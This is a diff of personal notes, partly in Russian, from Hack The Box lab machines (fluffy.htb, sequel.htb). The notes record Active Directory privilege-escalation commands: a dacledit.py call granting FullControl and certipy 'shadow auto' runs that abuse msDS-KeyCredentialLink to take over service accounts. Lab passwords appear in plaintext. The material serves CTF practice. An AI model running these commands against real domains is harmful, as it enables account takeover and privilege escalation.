@@ -85,6 +85,9 @@ Silvercore_21
 
 # WriteOwner
 
+     Shadow Credential
+     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
+
 
  Мы можем попытаться сделать райана владельцем ca_svc с помощью этой команды
 
@@ -96,7 +99,7 @@ Silvercore_21
     python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
     После предоставления полного доступа для получения хэша пользователя ca_svc нам нужно выполнить атаку с использованием теневых учётных данных. Эта атака добавляет ключ пользователя ryan в msDS-KeyCredentialLink пользователя ca_svc. После этого пользователь ryan становится копией пользователя ca_svc. Для этого мы можем использовать инструмент certipy следующим образом
 
-
+    еще раз SHADOW Credentials
     certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
    
    # Write Owner
